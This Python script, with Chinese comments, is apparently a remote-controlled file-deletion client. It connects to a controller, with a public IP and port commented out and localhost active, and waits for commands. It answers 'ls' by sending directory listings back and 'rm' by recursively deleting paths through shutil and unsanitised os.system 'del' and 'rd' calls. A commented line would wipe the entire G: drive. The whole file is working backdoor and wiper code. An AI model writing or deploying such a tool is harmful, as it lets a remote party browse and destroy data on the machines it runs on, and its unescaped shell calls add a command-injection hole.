import socket  # 导入 socket 模块
import os,sys,shutil

client = socket.socket()  # 创建 socket 对象
# client.connect(('39.105.91.77', 9090))
client.connect(('127.0.0.1', 9099))
print(client.recv(1024).decode(encoding='utf8'))
client.send("用来删除文件的客户端连接了".encode('utf8'))
# print(s.recv(1024).decode(encoding='utf8'))
while True:
    data = client.recv(1024).decode('utf8')
    print('接受到消息：',data)
    if data.startswith('ls'):
        if len(data)>2:
            client.send(str(os.listdir(data.split(' ')[1])).encode('utf8'))
        else:
            client.send(str(os.listdir()).encode('utf8'))
    if data.startswith('rm'):
        try:
            revStr = data
            if len(revStr)>2:
                cmdArr = revStr.split(' ')
                if len(cmdArr)>1:
                    pathStr = cmdArr[1]
                    print("pathStr:",pathStr)
                    shutil.rmtree(pathStr,ignore_errors=True)
                    os.system("del /F /S /Q "+pathStr)
                    os.system('rd /s /q '+pathStr)
            # os.remove('D:\\temp.txt')
            # shutil.rmtree("G:\\", ignore_errors=True)
            print('文件删除成功')
        except Exception as e:
            print(e)

input("")
